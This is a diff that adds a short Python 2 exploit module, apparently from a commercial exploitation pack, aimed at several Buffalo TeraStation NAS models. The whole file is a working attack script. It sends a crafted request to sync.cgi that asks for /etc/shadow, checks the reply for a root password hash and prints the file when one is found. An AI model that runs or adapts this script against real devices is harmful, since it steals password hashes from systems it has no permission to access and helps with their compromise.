@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_terastation_1'
+_vendor_ = 'terastation'
+_model_  = ['TS-XL', 'TS-RXL', 'TS-WXL', 'TS-HTGL/R5', 'TS-XEL']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.andreafabrizi.it/2013/01/30/Buffalo-TeraStation-multiple-vulnerabilities/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/etc/shadow' % (host,port)        
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'root:$' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
